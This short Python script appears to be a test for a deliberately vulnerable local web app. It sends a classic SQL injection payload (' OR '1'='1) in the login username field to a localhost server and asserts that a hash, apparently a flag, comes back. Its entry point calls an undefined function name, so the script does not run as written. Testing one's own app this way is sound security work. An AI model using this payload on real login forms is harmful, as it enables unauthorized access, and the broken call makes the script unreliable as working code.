from bs4 import BeautifulSoup
import requests


def classic_sql():
    """
    Classic Sql injection Test
    """
    classic = requests.post("http://localhost:5000/login", {"username": "admin@user.com\' OR \'1\'=\'1", "password": ""}).text
    soup = BeautifulSoup(classic, "html.parser")
    text=soup.find_all(text=True)
    print(text)
    assert "7476de220a716fec6159e5f9129b4caf80e052c850531cf3291b9abefd831400" in text

if __name__ == '__main__':
    sclassic_sql()
